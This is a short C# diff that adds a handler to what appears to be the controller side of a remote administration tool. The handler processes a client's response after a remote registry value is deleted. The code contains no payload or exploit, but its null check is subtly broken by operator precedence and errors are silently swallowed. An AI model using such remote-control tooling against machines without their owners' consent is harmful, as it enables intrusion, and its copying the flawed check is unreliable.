@@ -113,6 +113,26 @@ namespace xServer.Core.Commands
             catch { }
         }
 
+        public static void HandleDeleteRegistryValue(xServer.Core.Packets.ClientPackets.GetDeleteRegistryValueResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.DeleteValueFromList(packet.KeyPath, packet.ValueName);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
+
         #endregion
     }
 }
